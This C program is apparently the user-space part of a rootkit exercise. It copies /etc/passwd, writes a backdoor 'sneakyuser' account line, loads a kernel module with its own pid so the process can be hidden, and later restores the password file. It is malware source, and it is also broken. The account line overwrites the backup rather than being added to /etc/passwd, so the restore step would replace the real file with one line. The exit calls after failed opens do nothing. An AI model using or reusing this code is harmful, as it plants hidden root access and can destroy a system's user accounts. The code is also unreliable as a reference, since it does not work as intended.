#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

void add_to_pw(const char *fileName, const char *line){
    FILE *file = fopen(fileName, "w");
    if(!file){
        perror("Fail to open file for writing in pw\n");
        EXIT_FAILURE;
    }
    fprintf(file,"%s",line);
    fclose(file);
}

void copy_file(const char *origin_file, const char *dest_file){
    FILE *origin = fopen(origin_file,"r");
    FILE *dest = fopen(dest_file,"w");
    if(!origin){
        perror("Fail to open the origin file\n");
        EXIT_FAILURE;
    }
    if(!dest){
        perror("Fail to open file at destination location\n");
        EXIT_FAILURE;
    }
    char c = fgetc(origin);
    while( c !=EOF){
        fputc(c, dest);
        c = fgetc(origin);
    }
    fclose(origin);
    fclose(dest);
}

int main(){
    printf("sneaky_process pid = %d\n", getpid());
    copy_file("/etc/passwd","/tmp/passwd");
    add_to_pw("/tmp/passwd","sneakyuser:abc123:2000:2000:sneakyuser:/root:bash");

    char command[100];
    sprintf(command, "insmod sneaky_mod.ko sneaky_pid=%d", (int)getpid());
    system(command);

    char input;
    input = getchar();
    while(input!='q'){
        input = getchar();
    }

    system("rmmod sneaky_mod.ko");
    
    copy_file("/tmp/passwd", "/etc/passwd");
    system("rm /tmp/passwd");
    return EXIT_SUCCESS;
}